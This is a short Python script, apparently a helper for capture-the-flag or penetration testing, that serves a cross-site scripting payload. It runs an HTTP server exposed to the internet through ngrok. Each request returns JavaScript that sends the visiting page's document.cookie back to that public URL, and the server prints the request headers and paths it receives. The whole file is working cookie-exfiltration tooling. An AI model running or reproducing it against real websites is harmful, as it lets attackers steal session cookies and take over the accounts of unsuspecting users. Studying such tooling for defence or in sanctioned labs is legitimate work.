#!/usr/bin/env python3
# adapted from https://gist.github.com/phrawzty/62540f146ee5e74ea1ab
from http.server import HTTPServer, SimpleHTTPRequestHandler
import logging
import os
from urllib.parse import urlparse
import threading
from pyngrok import ngrok

PORT = 8000

class XSSHandler(SimpleHTTPRequestHandler):
    url = 'http://localhost:%d' % PORT
    def do_GET(self):
        """
        Do a get request.

        Args:
            self: (todo): write your description
        """
        print(self.headers)
        urlparts = urlparse(self.path)
        print(urlparts)

        self.send_response(200)
        self.send_header('Content-Type', 'text/javascript')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(f"fetch('{self.url}/x?' + document.cookie)".encode())

def start_server():
    """
    Starts a server.

    Args:
    """
    os.chdir('static')
    httpd = HTTPServer(("", PORT), XSSHandler)
    httpd.allow_reuse_address = True
    t = threading.Thread(target=httpd.serve_forever)
    t.daemon = True
    t.start()

    url = ngrok.connect(port=PORT, proto='http')
    url = url.replace('http', 'https')
    XSSHandler.url = url
    return url

if __name__ == '__main__':
    import time
    url = start_server()
    print(url)
    while 1:
        time.sleep(1)
